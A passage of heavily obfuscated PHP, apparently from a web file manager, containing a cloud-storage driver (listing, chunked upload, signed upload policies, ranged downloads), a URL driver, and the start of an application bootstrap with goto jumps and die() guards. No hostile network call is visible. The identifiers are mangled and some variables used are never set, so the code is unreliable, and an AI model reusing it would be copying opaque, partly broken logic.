get_path_father($Õ×³Œ®¹) . $ÇÏ¢˜±Ú; return $this->moveFile($Õ×³Œ®¹, $ÇÏ¢˜±Ú); } return $this->renameObject($Õ×³Œ®¹, $ÇÏ¢˜±Ú); } public function fileInfo($Ÿ“Â×ù¸, $ß·Öñİí = false, $•ƒî¥ßõ = array()) { $Ä±À¨Á =& $_SERVER[Ì¥ŞÒ°£]; $›‹¼é‚º = array($Ä±À¨Á[32] => $this->pathThis($Ÿ“Â×ù¸), $Ä±À¨Á[84] => $this->getPathOuter($Ä±À¨Á[8] . $Ÿ“Â×ù¸), $Ä±À¨Á[33] => $Ä±À¨Á[199], $Ä±À¨Á[76] => isset($•ƒî¥ßõ[$Ä±À¨Á[76]]) ? $•ƒî¥ßõ[$Ä±À¨Á[76]] : 0, $Ä±À¨Á[174] => $this->ext($Ÿ“Â×ù¸)); if ($ß·Öñİí) { return $›‹¼é‚º; } $›‹¼é‚º[$Ä±À¨Á[200]] = $›‹¼é‚º[$Ä±À¨Á[85]] = 0; $›‹¼é‚º[$Ä±À¨Á[201]] = $›‹¼é‚º[$Ä±À¨Á[202]] = !0; if (empty($•ƒî¥ßõ)) { $•ƒî¥ßõ = $this->objectMeta($Ÿ“Â×ù¸); if (!$•ƒî¥ßõ) { return $›‹¼é‚º; } } $›‹¼é‚º[$Ä±À¨Á[200]] = intval($•ƒî¥ßõ[$Ä±À¨Á[1478]]); $›‹¼é‚º[$Ä±À¨Á[85]] = intval($•ƒî¥ßõ[$Ä±À¨Á[1479]]); $›‹¼é‚º[$Ä±À¨Á[76]] = $•ƒî¥ßõ[$Ä±À¨Á[76]]; return $›‹¼é‚º; } public function folderInfo($òšŸ¥ê, $º÷€±³¶ = false) { $´¬ü¸Ï =& $_SERVER[Ì¥ŞÒ°£]; $¾­¥Ùéø = array($´¬ü¸Ï[32] => $this->pathThis($òšŸ¥ê), $´¬ü¸Ï[84] => $this->getPathOuter($´¬ü¸Ï[8] . $òšŸ¥ê), $´¬ü¸Ï[33] => $´¬ü¸Ï[75]); if ($º÷€±³¶) { return $¾­¥Ùéø; } $¾­¥Ùéø[$´¬ü¸Ï[200]] = $¾­¥Ùéø[$´¬ü¸Ï[85]] = 0; $¾­¥Ùéø[$´¬ü¸Ï[201]] = $¾­¥Ùéø[$´¬ü¸Ï[202]] = !0; if (empty($ÛùÑ­é®)) { $ÛùÑ­é® = $this->objectMeta($òšŸ¥ê); if (!$ÛùÑ­é®) { return $¾­¥Ùéø; } } $¾­¥Ùéø[$´¬ü¸Ï[200]] = intval($ÛùÑ­é®[$´¬ü¸Ï[1478]]); $¾­¥Ùéø[$´¬ü¸Ï[85]] = intval($ÛùÑ­é®[$´¬ü¸Ï[1479]]); return $¾­¥Ùéø; } private function listObjs($”ç—ÅÎş, $ÖÅ†» = 0, $®¸åÃè = 1000) { $öªø…½ =& $_SERVER[Ì¥ŞÒ°£]; $º÷“±¦ = array($öªø…½[1480], $öªø…½[1481] . $®¸åÃè); if ($ÖÅ†») { $º÷“±¦[] = $öªø…½[1482] . $ÖÅ†»; } $Ö±Ãºø¯ = $this->ussRequest($”ç—ÅÎş, $öªø…½[230], !1, $º÷“±¦); return !$Ö±Ãºø¯[$öªø…½[1218]] ? !1 : $Ö±Ãºø¯[$öªø…½[1208]]; } private function fileList($Ğ—œÆ¥Æ, &$Ï…›æø‘, &$ı²Åáä…, $©½èáíÑ = false) { $²‰Á•Â =& $_SERVER[Ì¥ŞÒ°£]; $–»è‘ÅŒ = $²‰Á•Â[12]; $ºÂïé’á = 1000; $ÇøÈ¦ù = rtrim($Ğ—œÆ¥Æ, $²‰Á•Â[8]) . $²‰Á•Â[8]; while (!0) { check_abort(); $€Õ²€‚ø = $this->listObjs($Ğ—œÆ¥Æ, $–»è‘ÅŒ, $ºÂïé’á); if (!$€Õ²€‚ø) { return !1; } $–»è‘ÅŒ = isset($€Õ²€‚ø[$²‰Á•Â[1483]]) ? $€Õ²€‚ø[$²‰Á•Â[1483]] : $²‰Á•Â[12]; $¢Êßê… = isset($€Õ²€‚ø[$²‰Á•Â[1484]]) ? $€Õ²€‚ø[$²‰Á•Â[1484]] : array(); foreach ($¢Êßê… as $…ïì‘İá) { $¨ÁùİÁï = $…ïì‘İá[$²‰Á•Â[33]] == $²‰Á•Â[75] ? !0 : !1; $âŸªÖ» = ltrim($ÇøÈ¦ù . $…ïì‘İá[$²‰Á•Â[32]], $²‰Á•Â[8]) . ($¨ÁùİÁï ? $²‰Á•Â[8] : $²‰Á•Â[12]); $²®ÍÁ¨Î = array($²‰Á•Â[32] => $âŸªÖ», $²‰Á•Â[33] => $¨ÁùİÁï ? $²‰Á•Â[75] : $²‰Á•Â[199], $²‰Á•Â[76] => $…ïì‘İá[$²‰Á•Â[337]], $²‰Á•Â[1479] => $…ïì‘İá[$²‰Á•Â[1485]]); $this->cacheMethodInfoSet($âŸªÖ», $¨ÁùİÁï, $²®ÍÁ¨Î); if ($¨ÁùİÁï) { $Ï…›æø‘[] = $âŸªÖ»; if ($©½èáíÑ) { $this->fileList($âŸªÖ», $Ï…›æø‘, $ı²Åáä…, $©½èáíÑ); } continue; } $ı²Åáä…[] = $²®ÍÁ¨Î; } if (count($¢Êßê…) < $ºÂïé’á) { break; } } $this->cacheMethodInfoSet($Ğ—œÆ¥Æ, !0); } public function listPath($´Éúˆ‡¦, $Ñ¿Ç”ß = false) { $£›’›ó÷ =& $_SERVER[Ì¥ŞÒ°£]; $¬ú¯„‡™ = $Å÷ÉàÆ = array(); $this->fileList($´Éúˆ‡¦, $¬ú¯„‡™, $Å÷ÉàÆ); foreach ($¬ú¯„‡™ as $“ïî¸Óİ => $À¯ÛÑÍ­) { $¬ú¯„‡™[$“ïî¸Óİ] = $this->folderInfo($À¯ÛÑÍ­, $Ñ¿Ç”ß); } foreach ($Å÷ÉàÆ as $“ïî¸Óİ => $À¯ÛÑÍ­) { $Å÷ÉàÆ[$“ïî¸Óİ] = $this->fileInfo($À¯ÛÑÍ­[$£›’›ó÷[32]], $Ñ¿Ç”ß, $À¯ÛÑÍ­); } return array($£›’›ó÷[82] => $¬ú¯„‡™, $£›’›ó÷[83] => $Å÷ÉàÆ); } public function has($ä¾ŠéÑµ, $Ó…Öş† = false, $Àû³°ıá = true) { $Œ¼áÜÛ’ =& $_SERVER[Ì¥ŞÒ°£]; $ú÷×  Î = $Œ¼áÜÛ’[12]; $úüˆßšä = 500; $¤î‘® = 0; $×¶’ÜÒÛ = 0; $²«ß¡ü› = rtrim($ä¾ŠéÑµ, $Œ¼áÜÛ’[8]) . $Œ¼áÜÛ’[8]; while (!0) { check_abort(); $ª¯æ¸‰Å = $this->listObjs($ä¾ŠéÑµ, $ú÷×  Î, $úüˆßšä); if (!$ª¯æ¸‰Å) { return !1; } $ú÷×  Î = isset($ª¯æ¸‰Å[$Œ¼áÜÛ’[1483]]) ? $ª¯æ¸‰Å[$Œ¼áÜÛ’[1483]] : $Œ¼áÜÛ’[12]; $‹å–ÔÕö = isset($ª¯æ¸‰Å[$Œ¼áÜÛ’[1484]]) ? $ª¯æ¸‰Å[$Œ¼áÜÛ’[1484]] : array(); if (empty($‹å–ÔÕö)) { break; } $­¤Ÿ¸Ã„ = array_filter($‹å–ÔÕö, function ($ÔÒ—Îº–) { $ÙÓÏ€ê² =& $_SERVER[Ì¥ŞÒ°£]; return $ÔÒ—Îº–[$ÙÓÏ€ê²[33]] == $ÙÓÏ€ê²[75]; }); $õÓ·×Õ¯ = count($‹å–ÔÕö); $­¤Ÿ¸Ã„ = count($­¤Ÿ¸Ã„); $¼¼º±¨… = $õÓ·×Õ¯ - $­¤Ÿ¸Ã„; if ($Ó…Öş†) { $×¶’ÜÒÛ += $­¤Ÿ¸Ã„; $¤î‘® += $¼¼º±¨…; if ($õÓ·×Õ¯ < $úüˆßšä) { break; } continue; } if ($Àû³°ıá) { if ($¼¼º±¨…) { return !0; } } else { if ($­¤Ÿ¸Ã„) { return !0; } } if ($õÓ·×Õ¯ < $úüˆßšä) { break; } } if ($Ó…Öş†) { return array($Œ¼áÜÛ’[207] => $¤î‘®, $Œ¼áÜÛ’[208] => $×¶’ÜÒÛ); } return !1; } public function listAll($‹›áí¼…) { $Œúö¿² =& $_SERVER[Ì¥ŞÒ°£]; $òõ¢‹¯Ñ = $êíìÂ´ = array(); $this->fileList($‹›áí¼…, $òõ¢‹¯Ñ, $êíìÂ´, !0); $À”ğÖÊä = array(); foreach ($êíìÂ´ as $†ÄÏş¢›) { $À”ğÖÊä[$†ÄÏş¢›[$Œúö¿²[32]]] = $†ÄÏş¢›[$Œúö¿²[76]]; } foreach ($òõ¢‹¯Ñ as $†ÄÏş¢›) { if (is_string($†ÄÏş¢›)) { $À”ğÖÊä[$†ÄÏş¢›] = 0; } } return $this->listAllFiles($‹›áí¼…, array_keys($À”ğÖÊä), $À”ğÖÊä); } public function canRead($‘§¥ÛŒ) { return $this->exist($‘§¥ÛŒ) ? !0 : !1; } public function canWrite($Ş¸óÛ½Ò) { return $this->exist($Ş¸óÛ½Ò) ? !0 : !1; } public function getContent($ºµ¦µËÆ) { return $this->fileSubstr($ºµ¦µËÆ, 0, -1); } public function setContent($ó›¨Ñä, $ûù÷¸ˆ = '') { $™ìâıßµ =& $_SERVER[Ì¥ŞÒ°£]; if (!$ûù÷¸ˆ) { $ı™ã­Õ = $this->ussRequest($ó›¨Ñä, $™ìâıßµ[226]); return $ı™ã­Õ[$™ìâıßµ[1218]]; } $É“šù÷› = $this->tempFile($this->pathThis($ó›¨Ñä)); file_put_contents($É“šù÷›, $ûù÷¸ˆ); if ($this->upload($ó›¨Ñä, $É“šù÷›)) { $this->tempFileRemve($É“šù÷›); return !0; } return !1; } public function fileSubstr($»ğ›†¦¯, $ÅÖş‘ª , $²ÆãšÉÜ) { $«€ÈçÅ† =& $_SERVER[Ì¥ŞÒ°£]; if (!($Í¸£Ü½¬ = $this->link($»ğ›†¦¯))) { return !1; } $ùÌæØÕ­ = !1; if ($²ÆãšÉÜ > 0) { $¿Çä“»û = $ÅÖş‘ª  + $²ÆãšÉÜ - 1; $ùÌæØÕ­ = array($«€ÈçÅ†[1446] . $ÅÖş‘ª  . $«€ÈçÅ†[386] . $¿Çä“»û); } $œ¬Ï«ø¨ = url_request($Í¸£Ü½¬, $«€ÈçÅ†[230], !1, $ùÌæØÕ­); return $œ¬Ï«ø¨[$«€ÈçÅ†[752]] ? $œ¬Ï«ø¨[$«€ÈçÅ†[1208]] : !1; } public function upload($í´ÌîÄ—, $âñ»Ñ²Á, $û”Ûˆ½¾ = false, $ÛÖš‹¥Ï = REPEAT_REPLACE) { $§¬ñÁİ =& $_SERVER[Ì¥ŞÒ°£]; $Ì¹ŒÙİ´ = IO::size($âñ»Ñ²Á); if ($Ì¹ŒÙİ´ <= 1024 * 1024 * 200) { $ıØîü¼ = array($§¬ñÁİ[1486] . $âñ»Ñ²Á); $†¯Ü®ã = $this->ussRequest($í´ÌîÄ—, $§¬ñÁİ[228], $ıØîü¼); return $†¯Ü®ã[$§¬ñÁİ[1218]] ? $this->getPathOuter($í´ÌîÄ—) : !1; } $§Ù‚š¥ş = 1024 * 1024 * 10; $áÅêÅÑÆ = array($§¬ñÁİ[1487], $§¬ñÁİ[1488] . $Ì¹ŒÙİ´, $§¬ñÁİ[1489], $§¬ñÁİ[1490] . $§Ù‚š¥ş); $†¯Ü®ã = $this->ussRequest($í´ÌîÄ—, $§¬ñÁİ[228], !1, $áÅêÅÑÆ); if (!$†¯Ü®ã[$§¬ñÁİ[1218]]) { return !1; } $»²ÃÉéœ = $†¯Ü®ã[$§¬ñÁİ[1208]]; $ëÈŸÙê = 0; $ô­Î±Æ” = $»²ÃÉéœ[$§¬ñÁİ[1491]]; $ÜÜ„Î = fopen($âñ»Ñ²Á, $§¬ñÁİ[1395]); if (!$ÜÜ„Î) { return !1; } do { $ò¼û·¿ê = $»²ÃÉéœ[$§¬ñÁİ[1492]]; fseek_64($ÜÜ„Î, $ëÈŸÙê); $·Œœ‰¹µ = fread($ÜÜ„Î, $ò¼û·¿ê); $îç¼©Ì = 0; do { $îç¼©Ì++; $»²ÃÉéœ = $this->uploadPart($í´ÌîÄ—, $»²ÃÉéœ, $·Œœ‰¹µ); } while (!$»²ÃÉéœ && $îç¼©Ì < 3); if (!$»²ÃÉéœ) { return !1; } $ô­Î±Æ” = $»²ÃÉéœ[$§¬ñÁİ[1491]]; $ëÈŸÙê += $ò¼û·¿ê; } while ($ô­Î±Æ” != -1); fclose($ÜÜ„Î); $áÅêÅÑÆ = array($§¬ñÁİ[1493], $§¬ñÁİ[1494] . $»²ÃÉéœ[$§¬ñÁİ[1495]], $§¬ñÁİ[1489]); $†¯Ü®ã = $this->ussRequest($í´ÌîÄ—, $§¬ñÁİ[228], !1, $áÅêÅÑÆ); return $†¯Ü®ã[$§¬ñÁİ[1218]] ? $this->getPathOuter($ˆÅšéÉÏ) : !1; } private function uploadPart($´¨ µ‘», $õ¬Ê¸, &$Êä–ìŠ¹) { $†öâÀáÓ =& $_SERVER[Ì¥ŞÒ°£]; $áŒÄÃ‹ = array($†öâÀáÓ[1496], $†öâÀáÓ[1494] . $õ¬Ê¸[$†öâÀáÓ[1495]], $†öâÀáÓ[1497] . $õ¬Ê¸[$†öâÀáÓ[1491]], $†öâÀáÓ[142] . $õ¬Ê¸[$†öâÀáÓ[1492]]); $‡Ø”Û…‚ = $this->ussRequest($´¨ µ‘», $†öâÀáÓ[228], $Êä–ìŠ¹, $áŒÄÃ‹); return !$‡Ø”Û…‚[$†öâÀáÓ[1218]] ? $‡Ø”Û…‚[$†öâÀáÓ[1218]] : $‡Ø”Û…‚[$†öâÀáÓ[1208]]; } public function uploadFormData($ÈïÉ’Àá, $ÇìÃõ£È = 3600) { return $this->uploadPolicy($ÈïÉ’Àá, $ÇìÃõ£È); } public function multiUploadFormData($ñ§µÄé, $¸¿ î‹ = 3600) { $ïÕ•¶à‹ =& $_SERVER[Ì¥ŞÒ°£]; $îº«úº = (int) $GLOBALS[$ïÕ•¶à‹[7]][$ïÕ•¶à‹[76]]; return $this->uploadPolicy($ñ§µÄé, $¸¿ î‹, $îº«úº); } private function uploadPolicy($”ŞãÜšó, $›ŠÖĞÙà = 3600, $œùï¬°Ë = 0) { $³»À»‚¥ =& $_SERVER[Ì¥ŞÒ°£]; $Û¦Á˜ë = $³»À»‚¥[8] . $this->bucket; $—–ƒ¥Â¼ = gmdate($³»À»‚¥[1431]); $™‰ß‡¶‰ = array($³»À»‚¥[1498] => $this->bucket, $³»À»‚¥[1499] => $”ŞãÜšó, $³»À»‚¥[1500] => time() + $›ŠÖĞÙà, $³»À»‚¥[1501] => $—–ƒ¥Â¼); if ($œùï¬°Ë) { $™‰ß‡¶‰[$³»À»‚¥[1411]] = $œùï¬°Ë; } $’Äğ°óÁ = base64_encode(json_encode($™‰ß‡¶‰)); $ª¾Ööƒ£ = base64_encode(hash_hmac($³»À»‚¥[1468], "\x50\x4f\x53\124\46{$Û¦Á˜ë}\46{$—–ƒ¥Â¼}\x26{$’Äğ°óÁ}", md5("{$this->userpass}"), !0)); $’™ÙÇÈ = array($³»À»‚¥[1336] => $’Äğ°óÁ, $³»À»‚¥[1502] => "\x55\120\x59\x55\116\x20{$this->username}\72{$ª¾Ööƒ£}", $³»À»‚¥[181] => $this->endpoint . $Û¦Á˜ë); return $’™ÙÇÈ; } public function download($½«‚ñÌâ, $ïîç–¿æ) { $¸È£üÄ× = IO::getPathInner(IO::mkfile($ïîç–¿æ)); if (!($ó¿±Ã• = $this->link($½«‚ñÌâ))) { return !1; } $”Ô’«¤ï = 0; $¤Ò«´º¯ = 1024 * 200; $“çÂ‰Æµ = fopen($¸È£üÄ×, $_SERVER[Ì¥ŞÒ°£][1452]); while (!0) { $Õ°„Ñ¼Œ = $this->fileSubstr($½«‚ñÌâ, $”Ô’«¤ï, $¤Ò«´º¯); if ($Õ°„Ñ¼Œ === !1) { return !1; } fwrite($“çÂ‰Æµ, $Õ°„Ñ¼Œ); $”Ô’«¤ï += $¤Ò«´º¯; if (strlen($Õ°„Ñ¼Œ) < $¤Ò«´º¯) { break; } } fclose($“çÂ‰Æµ); return $ïîç–¿æ; } public function link($¢ëÑÃ´«, $ ìŠÏ½Ú = array()) { $£ÆÕ‘¾– =& $_SERVER[Ì¥ŞÒ°£]; $¢ëÑÃ´« = trim($¢ëÑÃ´«, $£ÆÕ‘¾–[8]); if (!empty($this->token)) { $™–ÌåÖ¶ = strtotime(date($£ÆÕ‘¾–[1503])); $–»Ò•¶÷ = substr(md5($this->token . $£ÆÕ‘¾–[284] . $™–ÌåÖ¶ . $£ÆÕ‘¾–[1504] . $¢ëÑÃ´«), 12, 8) . $™–ÌåÖ¶; $ ìŠÏ½Ú[] = $£ÆÕ‘¾–[1505] . $–»Ò•¶÷; } $ÊËøÕŸÒ = !empty($ ìŠÏ½Ú) ? $£ÆÕ‘¾–[73] . implode($£ÆÕ‘¾–[284], $ ìŠÏ½Ú) : $£ÆÕ‘¾–[12]; return $this->getHost() . $£ÆÕ‘¾–[8] . $¢ëÑÃ´« . $ÊËøÕŸÒ; } public function fileOut($ÄÎßñ•, $’á–øÜÙ = false, $ØÖÈ·ññ = false, $Ëêô´™ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ÄÎßñ•, $’á–øÜÙ, $ØÖÈ·ññ, $Ëêô´™); } if (!$ØÖÈ·ññ) { $ØÖÈ·ññ = $this->pathThis($ÄÎßñ•); } $ßÈ÷‚Ø = $’á–øÜÙ ? array($_SERVER[Ì¥ŞÒ°£][1506] . rawurlencode($ØÖÈ·ññ)) : array(); $ñ‰Š¿Öê = $this->link($ÄÎßñ•, $ßÈ÷‚Ø); $this->fileOutLink($ñ‰Š¿Öê); } public function fileOutServer($”ò§‡üƒ, $ÈÊ™”£ = false, $ò•«İá = false, $ŸÌÌÀúÄ = '') { parent::fileOut($”ò§‡üƒ, $ÈÊ™”£, $ò•«İá, $ŸÌÌÀúÄ); } public function fileOutImage($øÆ×Ó›¤, $ı³·†Ä¢ = 250) { $¨¼¢Š¥Ü = $this->link($øÆ×Ó›¤ . $_SERVER[Ì¥ŞÒ°£][1507] . $ı³·†Ä¢); $this->fileOutLink($¨¼¢Š¥Ü); } public function fileOutImageServer($Á´âÅ¢¤, $®ÉÅä¼ú = 250) { parent::fileOutImage($Á´âÅ¢¤, $®ÉÅä¼ú); } public function hashMd5($­“æÅ­Ç) { $œãÇŸÔä =& $_SERVER[Ì¥ŞÒ°£]; $½óËÆ¨ù = $this->_objectMeta($­“æÅ­Ç); return isset($½óËÆ¨ù[$œãÇŸÔä[212]]) ? $½óËÆ¨ù[$œãÇŸÔä[212]] : !1; } public function size($Ô“°çƒâ) { $åË€‰•µ = $this->objectMeta($Ô“°çƒâ); return $åË€‰•µ ? $åË€‰•µ[$_SERVER[Ì¥ŞÒ°£][76]] : 0; } public function info($ã©«Á) { if ($this->isFolder($ã©«Á)) { return $this->folderInfo($ã©«Á); } else { if ($this->isFile($ã©«Á)) { return $this->fileInfo($ã©«Á); } } return !1; } public function exist($ÓÑÊ¨¡—) { return $this->isFile($ÓÑÊ¨¡—) || $this->isFolder($ÓÑÊ¨¡—); } public function isFile($Ş­¤÷é¤) { return !$this->isFolder($Ş­¤÷é¤) && $this->objectMeta($Ş­¤÷é¤); } public function isFolder($ã ¢äËº) { return $this->cacheMethod($_SERVER[Ì¥ŞÒ°£][165], $ã ¢äËº); } protected function objectMeta($š¶ËÁÅÁ) { return $this->cacheMethod($_SERVER[Ì¥ŞÒ°£][167], $š¶ËÁÅÁ); } protected function _objectMeta($®Çëè©) { $ËÊªÒ¶ =& $_SERVER[Ì¥ŞÒ°£]; if ($®Çëè© == $ËÊªÒ¶[12] || $®Çëè© == $ËÊªÒ¶[8]) { return array(); } $°ú—ÖïÁ = $this->ussRequest($®Çëè©, $ËÊªÒ¶[1508]); if (!$°ú—ÖïÁ[$ËÊªÒ¶[1218]]) { return null; } $ış„ª = isset($°ú—ÖïÁ[$ËÊªÒ¶[1208]]) ? $°ú—ÖïÁ[$ËÊªÒ¶[1208]] : array(); if (!isset($ış„ª[$ËÊªÒ¶[1509]])) { return null; } $Œİ”æÓ· = array($ËÊªÒ¶[33] => isset($ış„ª[$ËÊªÒ¶[1509]]) ? $ış„ª[$ËÊªÒ¶[1509]] : null, $ËÊªÒ¶[76] => isset($ış„ª[$ËÊªÒ¶[1510]]) ? $ış„ª[$ËÊªÒ¶[1510]] : null, $ËÊªÒ¶[212] => isset($ış„ª[$ËÊªÒ¶[1511]]) ? $ış„ª[$ËÊªÒ¶[1511]] : null, $ËÊªÒ¶[1478] => isset($ış„ª[$ËÊªÒ¶[1512]]) ? $ış„ª[$ËÊªÒ¶[1512]] : null); $Œİ”æÓ·[$ËÊªÒ¶[1479]] = isset($ış„ª[$ËÊªÒ¶[1513]]) ? strtotime($ış„ª[$ËÊªÒ¶[1513]]) : $Œİ”æÓ·[$ËÊªÒ¶[1478]]; return $Œİ”æÓ·; } protected function _isFolder($ìÉ€±Í) { $œœ¸“û¦ =& $_SERVER[Ì¥ŞÒ°£]; if ($ìÉ€±Í == $œœ¸“û¦[12] || $ìÉ€±Í == $œœ¸“û¦[8]) { return !0; } $çâõ¶ = $this->_objectMeta($ìÉ€±Í); return isset($çâõ¶[$œœ¸“û¦[33]]) && $çâõ¶[$œœ¸“û¦[33]] == $œœ¸“û¦[75] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($òÅØÎ« = false) { } public function exist($§„ÃÑ¸‘) { $ñ€Ëğİš = $this->info($§„ÃÑ¸‘); return $ñ€Ëğİš[$_SERVER[Ì¥ŞÒ°£][201]]; } public function isFile($“¦Êëòç) { $ğİ¨òŠÓ = $this->info($“¦Êëòç); return $ğİ¨òŠÓ[$_SERVER[Ì¥ŞÒ°£][201]]; } public function isFolder($ãÊ”Ìµ) { return !1; } public function size($Õ¢ÖˆÎİ) { $ˆ §äè = $this->info($Õ¢ÖˆÎİ); return $ˆ §äè[$_SERVER[Ì¥ŞÒ°£][76]]; } public function info($¥‰ÙĞ¶Ó) { return $this->infoParse($¥‰ÙĞ¶Ó); } public function infoAuth($ŞÙù±¬) { return $this->infoParse($ŞÙù±¬); } public function infoWithChildren($ìØ¨‰Ê) { return $this->infoParse($ìØ¨‰Ê); } public function infoFull($ª³–Èº†) { return $this->infoParse($ª³–Èº†); } private function infoParse($¿×‚¡©À) { $ó—Ê‘Î“ =& $_SERVER[Ì¥ŞÒ°£]; $®ƒ˜À€û = $this->header($¿×‚¡©À); if (!$®ƒ˜À€û || !$®ƒ˜À€û[$ó—Ê‘Î“[752]]) { return !1; } $˜ÑğŸîë = _get($®ƒ˜À€û, $ó—Ê‘Î“[337], 0); $¤ê¡È–€ = array($ó—Ê‘Î“[32] => $®ƒ˜À€û[$ó—Ê‘Î“[32]], $ó—Ê‘Î“[84] => $¿×‚¡©À, $ó—Ê‘Î“[33] => $ó—Ê‘Î“[199], $ó—Ê‘Î“[76] => intval($˜ÑğŸîë), $ó—Ê‘Î“[174] => get_path_ext($®ƒ˜À€û[$ó—Ê‘Î“[32]]), $ó—Ê‘Î“[1392] => $˜ÑğŸîë > 0 && $®ƒ˜À€û[$ó—Ê‘Î“[1514]], $ó—Ê‘Î“[1393] => !1); return $¤ê¡È–€; } private function header($ºß†°œ) { $×ÅµÌà« =& $_SERVER[Ì¥ŞÒ°£]; if (isset(self::$_cacheHeader[$ºß†°œ])) { return self::$_cacheHeader[$ºß†°œ]; } $·µôº¥í = isset($GLOBALS[$×ÅµÌà«[1515]]) ? $GLOBALS[$×ÅµÌà«[1515]] : !1; $GLOBALS[$×ÅµÌà«[1515]] = !0; self::$_cacheHeader[$ºß†°œ] = url_header($ºß†°œ); $GLOBALS[$×ÅµÌà«[1515]] = $·µôº¥í; return self::$_cacheHeader[$ºß†°œ]; } public function hashSimple($ùÏìÁ¾ø, $«Ëâ–¢­ = false) { $¸óÅ­ =& $_SERVER[Ì¥ŞÒ°£]; $ÅæÁÕºê = $this->info($ùÏìÁ¾ø); if (!$ÅæÁÕºê || !$ÅæÁÕºê[$¸óÅ­[201]]) { return !1; } $æ‰äà¹ú = $ÅæÁÕºê[$¸óÅ­[76]]; $úí£“»ğ = 200; $”€ğâÛó = 50; if ($æ‰äà¹ú <= $úí£“»ğ * $”€ğâÛó) { return md5($this->fileSubstr($ùÏìÁ¾ø, 0, $æ‰äà¹ú)) . $æ‰äà¹ú; } $ÛÇìåÙÊ = intval($æ‰äà¹ú / $”€ğâÛó); $ôê™åĞ™ = $¸óÅ­[12]; $ö£Ö£Ã = timeFloat(); $·ü×ÅÁ  = 15; for ($Ÿ© üÒ« = 0; $Ÿ© üÒ« < $”€ğâÛó; $Ÿ© üÒ«++) { if (timeFloat() - $ö£Ö£Ã > $·ü×ÅÁ ) { return !1; } $›¡¦Ó›à = $this->fileSubstr($ùÏìÁ¾ø, $ÛÇìåÙÊ * $Ÿ© üÒ«, $úí£“»ğ); if (!$›¡¦Ó›à) { return !1; } $ôê™åĞ™ .= $›¡¦Ó›à; } $ôê™åĞ™ .= $this->fileSubstr($ùÏìÁ¾ø, $æ‰äà¹ú - $úí£“»ğ, $úí£“»ğ); return md5($ôê™åĞ™) . $æ‰äà¹ú; } public function getContent($ò…úğ‰È) { return $this->fileSubstr($ò…úğ‰È); } public function fileSubstr($•ÀÒäØ¸, $€ƒÌÛ©´ = 0, $Ûšœ”ì = -1) { $Ú©ÊÅ„ß =& $_SERVER[Ì¥ŞÒ°£]; $Û„äÙ‹Ú = $this->info($•ÀÒäØ¸); if (!$Û„äÙ‹Ú || !$Û„äÙ‹Ú[$Ú©ÊÅ„ß[201]] && $Û„äÙ‹Ú[$Ú©ÊÅ„ß[76]] > 1024 * 1024 * 10) { return !1; } if ($Ûšœ”ì === -1) { $Ûšœ”ì = $Û„äÙ‹Ú[$Ú©ÊÅ„ß[76]]; } if ($Ûšœ”ì == 0) { return $Ú©ÊÅ„ß[12]; } $”î„…ë = array($Ú©ÊÅ„ß[1516] . $€ƒÌÛ©´ . $Ú©ÊÅ„ß[784] . ($€ƒÌÛ©´ + $Ûšœ”ì - 1)); $ãÖııï = url_request($•ÀÒäØ¸, $Ú©ÊÅ„ß[230], !1, $”î„…ë, !1, !1, 30); return $ãÖııï[$Ú©ÊÅ„ß[1208]] ? $ãÖııï[$Ú©ÊÅ„ß[1208]] : $Ú©ÊÅ„ß[12]; } public function download($˜ôˆ¸ğ, $…ğÑç€£) { Downloader::start($˜ôˆ¸ğ, $…ğÑç€£); return $…ğÑç€£; } } goto f‰ñœ˜òù»; f‰–ÓŞµ±: class Application { private $defaultModule = "\151\x6e\144\145\170"; private $defaultController = "\151\x6e\144\145\x78"; private $defaultAction = "\151\x6e\x64\145\170"; function __construct() { } public function setDefault($¾—ø›‘è) { $û¸ƒ–îß =& $_SERVER[Üè·¥©¸]; $Øƒ˜å» = explode($û¸ƒ–îß[0], trim($¾—ø›‘è, $û¸ƒ–îß[0])); $¸×ñä¬¤ = $_SERVER[Ì¥ŞÒ°£][619]; if (!$¸×ñä¬¤) { die; } $this->defaultModule = $Øƒ˜å»[0] ? $Øƒ˜å»[0] : $this->defaultModule; $this->defaultController = $Øƒ˜å»[1] ? $Øƒ˜å»[1] : $this->defaultController; $this->defaultAction = $Øƒ˜å»[2] ? $Øƒ˜å»[2] : $this->defaultAction; $this->iusp149fcc95($û¸ƒ–îß[1], array($this, $û¸ƒ–îß[2])); } public function appRun($›æ§—¶¢) { $úÇŸšŞŸ =& $_SERVER[Ì¥ŞÒ°£]; $—«ˆêíª =& $_SERVER[Üè·¥©¸]; $½ƒùÄù¦ = explode($—«ˆêíª[0], $›æ§—¶¢); $ª¼ÖÛŠ = $úÇŸšŞŸ[620]; while (strlen($ª¼ÖÛŠ) < $úÇŸšŞŸ[621]) { if (!$ª¼ÖÛŠ) { break; } $ª¼ÖÛŠ++; } $şÎİò”Ÿ = strtolower($½ƒùÄù¦[0]); $Ò®¶×«Á = $—«ˆêíª[3]; $Ø–çßã = $úÇŸšŞŸ[622]; while (strlen($Ø–çßã) < $úÇŸšŞŸ[615]) { if (!$Ø–çßã) { break; } $Ø–çßã++; } if ($şÎİò”Ÿ == $—«ˆêíª[4]) { $Ò®¶×«Á = $—«ˆêíª[5]; $½ƒùÄù¦[0] = $—«ˆêíª[6]; $½ƒùÄù¦[1] = $½ƒùÄù¦[1] . $—«ˆêíª[7]; $›æ§—¶¢ = join($—«ˆêíª[0], $½ƒùÄù¦); $›æ§—¶¢ = trim($›æ§—¶¢, $—«ˆêíª[0]); } call_user_func(array($—«ˆêíª[8], $—«ˆêíª[9]), $Ò®¶×«Á . $—«ˆêíª[10], $›æ§—¶¢); ActionCall($›æ§—¶¢); call_user_func(array($—«ˆêíª[8], $—«ˆêíª[9]), $Ò®¶×«Á . $—«ˆêíª[11], $›æ§—¶¢); $æ„…Š¶Û = $úÇŸšŞŸ[623]; if (strlen($æ„…Š¶Û) < $úÇŸšŞŸ[615]) { die; } } private function autorun() { $õæ²Î½ª =& $_SERVER[Ì¥ŞÒ°£]; $¶Â‹í±¡ =& $_SERVER[Üè·¥©¸]; global $config; $…§åêŸê = $õæ²Î½ª[624]; if (!$…§åêŸê) { die; } if (count($config[$¶Â‹í±¡[12]]) == 0) { return; } foreach ($config[$¶Â‹í±¡[12]] as $¯òÖËæ• => $êæÚ¸Û…) { $this->appRun($êæÚ¸Û…); $å¢›ÓÜ = $õæ²Î½ª[625]; if (!$å¢›ÓÜ) { die; } } } private function kyamb38fd7d7() { $ÍàÊ¥’÷ =& $_SERVER[Ì¥ŞÒ°£]; 